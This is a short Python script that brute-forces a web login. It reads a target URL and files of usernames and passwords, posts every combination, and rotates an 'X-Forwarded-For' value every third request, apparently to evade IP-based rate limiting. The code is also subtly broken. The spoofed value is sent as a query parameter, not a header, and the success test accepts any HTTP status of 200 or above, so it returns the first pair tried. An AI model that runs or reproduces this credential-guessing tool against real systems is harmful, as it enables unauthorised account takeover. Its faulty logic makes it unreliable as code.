import requests

url = str(input())
a = str(input())
b = str(input())


def getlist(link):
    with open(link) as f:
        content = f.readlines()
    # you may also want to remove whitespace characters like `\n` at the end of each line
    content_list = [x.strip() for x in content] 
    return content_list

password_list = getlist(a)   
user_list = getlist(b)

i = 500
def payload(url, password_list, user_list, i):
    c = 0
    for user in user_list :
        for passwod in password_list :
            pra = {'X-Forwarded-For' : str(i)}
            pload = {'username' : str(user) , 'password' : str(passwod)}
            rep = requests.post(url , data=pload , params=pra )
            c = c + 1
            if c % 3 == 0 :
                i = i + 1 
            if rep.status_code >= 200 :
                return user,passwod

result = payload(url, password_list, user_list, i)
print(result)
